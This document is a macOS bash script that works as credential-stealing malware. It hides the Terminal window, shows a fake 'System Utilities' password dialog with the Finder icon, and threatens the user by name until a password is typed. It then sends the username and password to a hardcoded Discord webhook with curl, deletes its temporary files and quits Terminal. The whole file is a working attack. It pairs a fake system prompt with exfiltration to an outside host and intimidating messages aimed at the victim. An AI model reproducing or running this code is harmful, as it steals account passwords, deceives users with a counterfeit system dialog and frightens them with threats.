#!/bin/bash

# Ensure Terminal is hidden initially
osascript -e 'tell app "Terminal" to set visible of front window to false'

# Get the current username (for header purposes)
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Initialize capture with a header line
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Define AppleScript for a persistent password prompt.
# It extracts the full name, splits it into first and last names,
# and repeatedly prompts until at least one character is entered.
read -r -d '' applescriptCode <<'EOF'
set fullName to (long user name of (system info))
set firstName to word 1 of fullName
set lastName to word -1 of fullName
set userPassword to ""
repeat while userPassword is ""
    try
        set userPassword to text returned of (display dialog "I know where you live, " & firstName & ".\n\nEnter your password, or I will leak your IP address, Mr. " & lastName with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
    on error
        set userPassword to ""
    end try
end repeat
return userPassword
EOF

# Execute the AppleScript synchronously and capture its output in a temporary file
osascript -e "$applescriptCode" > pass_temp.txt

# Read the password from the temporary file
if [ -f pass_temp.txt ]; then
    dialogText=$(cat pass_temp.txt)
    rm pass_temp.txt
else
    dialogText="CANCEL"
fi

# Append the password (or result) to the capture text
capture="${capture}password=${dialogText}"

# Save the captured information to pass.txt
echo -e "$capture" > pass.txt

# Send captured data to the Discord webhook using Python for proper JSON formatting
if [[ -f pass.txt ]]; then
    payload=$(python3 -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)
    curl -X POST -H "Content-Type: application/json" -d "$payload" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B
    rm pass.txt
else
    echo "Error: pass.txt not found" > error.txt
fi

# Quit Terminal after processing is complete
osascript -e 'tell app "Terminal" to quit'
